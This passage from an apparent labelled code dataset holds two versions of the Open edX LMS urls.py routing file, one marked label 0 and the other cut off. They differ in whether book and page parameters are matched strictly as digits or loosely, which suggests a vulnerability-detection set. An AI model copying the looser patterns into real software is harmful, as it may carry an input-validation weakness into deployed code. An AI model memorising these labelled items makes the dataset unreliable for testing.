'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n            'staticbook.views.index'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n            'staticbook.views.index_shifted'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n/n/n/n", "label": 0}, {"id": "4e4c209ae3deb4c78bcec89c181516af8604b450", "code": "/lms/urls.py/n/nfrom django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.index'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n            'staticbook.views.index_shifted'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.pdf_index'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.html_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        